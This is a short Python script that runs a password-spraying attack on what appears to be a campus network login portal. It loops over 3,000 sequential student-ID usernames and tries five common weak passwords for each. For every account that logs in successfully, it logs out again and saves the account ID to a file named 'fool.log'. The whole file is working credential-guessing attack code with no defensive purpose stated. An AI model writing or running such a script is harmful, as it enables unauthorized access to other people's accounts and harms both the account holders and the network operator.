import requests
import time
password = 'mima'
weakpswd = ['111111', '11111111', '666666', '888888', '88888888']
username = [1120170000 + i for i in range(3000)]
url = 'http://10.0.0.55:801/srun_portal_pc.php'
s = requests.session()
count = 0
foollist = []
for i in username:
    count += 1
    if count % 100 == 0:
        print(count)
    for j in weakpswd:
        response = s.post(
            url,
            data={
                'action': 'login',
                'username': i,
                'password': j,
                'ac_id': 8,
                'save_me': 0,
                'ajax': 1
            })
        if response.text[0:8] == 'login_ok':
            s.post(
                url,
                data={
                    'action': 'logout',
                    'username': str(username[count - 2]),
                    'password': j,
                    'ajax': 1
                })
            time.sleep(1.5)
            foollist.append(i)
            print(foollist, j)
        # exit()
foolstring = ''
for i in foollist:
    foolstring += str(i) + '\n'
with open('fool.log', 'w') as f:
    f.write(foolstring)